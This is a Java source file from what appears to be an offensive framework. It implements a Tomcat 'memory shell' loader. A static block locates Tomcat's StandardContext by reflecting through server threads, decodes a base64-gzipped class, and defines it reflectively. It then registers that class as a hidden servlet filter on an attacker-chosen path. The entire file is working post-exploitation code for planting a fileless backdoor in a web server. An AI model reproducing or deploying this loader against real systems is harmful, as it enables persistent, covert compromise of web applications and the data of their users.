package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 * 8.0.53
 */
@Middleware(Middleware.Tomcat)
@MemShell(MemShell.Filter)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
public class TomcatFilterThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    private static String PATH;
    private static String NAME;

    public TomcatFilterThreadLoader() {
    }

    static {
        try {
            // 获取 standardContext
            Object standardContext = getStandardContext();

            inject(standardContext);

        } catch (Throwable e) {

        }
    }


//    public static void inject(Object standardContext) throws Exception {
//    }

    /**
     * Tomcat Filter
     */
    public static void inject(Object standardContext) throws Exception {
        HashMap filterDefs = (HashMap) getFieldValue(standardContext, "filterDefs");
        if (filterDefs.containsKey(NAME)) {
            return;
        }

        // 动态代理兼容 javax jakarta
        Class filterClass = null;
        try {
            filterClass = Class.forName("jakarta.servlet.Filter");
        } catch (Exception e) {
            try {
                filterClass = Class.forName("javax.servlet.Filter");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }
        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(filterClass.getClassLoader(), new Class[]{filterClass}, (InvocationHandler) javaObject);

        // tomcat 7
        // org.apache.catalina.deploy.FilterDef
        // tomcat 8 9
        // org.apache.tomcat.util.descriptor.web.FilterDef
        Object filterDef;
        // 添加 filterDef
        try {
            filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
        } catch (ClassNotFoundException e) {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
        }

        setFieldValue(filterDef, "filterName", NAME);
        setFieldValue(filterDef, "filterClass", CLASSNAME);
        setFieldValue(filterDef, "filter", object);
        invokeMethod(standardContext.getClass(),standardContext, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});

        // 添加 filterMap
        Object filterMap = null;
        try {
            filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
        } catch (ClassNotFoundException e) {
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        }

        setFieldValue(filterMap, "filterName", NAME);
        invokeMethod(filterMap.getClass(), filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{PATH});
//        String[] urlPatterns = (String[]) getFieldValue(filterMap, "urlPatterns");
//        String[] results = new String[urlPatterns.length + 1];
//        System.arraycopy(urlPatterns, 0, results, 0, urlPatterns.length);
//        results[urlPatterns.length] = PATH;
//        urlPatterns = results;

        //    public static final int ERROR = 1;
        //    public static final int FORWARD = 2;
        //    public static final int INCLUDE = 4;
        //    public static final int REQUEST = 8;
        //    public static final int ASYNC = 16;
        setFieldValue(filterMap, "dispatcherMapping", 8);
        invokeMethod(standardContext.getClass(), standardContext, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});

        Map filterConfigs = (Map) getFieldValue(standardContext, "filterConfigs");
        Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
        constructor.setAccessible(true);
        Object filterConfig = constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(NAME, filterConfig);
    }

    public static Object getStandardContext() throws Exception {
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
//        Thread[] threads = new Thread[Thread.currentThread().getThreadGroup().activeCount()];
        for (int i = 0; i < threads.length; i++) {
            Thread thread = threads[i];
            // Thread 筛选
            if (thread == null)
                continue;
            String threadName = thread.getName();
            if (!(
                    ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                            || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                            || (threadName.contains("http-") && threadName.contains("Acceptor"))
            ))
                continue;
            Object target = getFieldValue(thread, "target");
            Object this0 = getFieldValue(target, "this$0");
            Object handler = getFieldValue(this0, "handler");
            Object global = getFieldValue(handler, "global");
            List processors = (List) getFieldValue(global, "processors");

            for (int j = 0; j < processors.size(); j++) {
                Object processor = processors.get(j);
                Object req = getFieldValue(processor, "req");
                Object request = req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));

                Object standardContext;
                try {
                    Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                    Object applicationContext = getFieldValue(servletContext, "context");
                    standardContext = getFieldValue(applicationContext, "context");
                } catch (NoSuchMethodException e) {
                    standardContext = getFieldValue(request, "context");
                }

                return standardContext;
            }
        }


        return null;
    }


    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws
            Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws
            Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
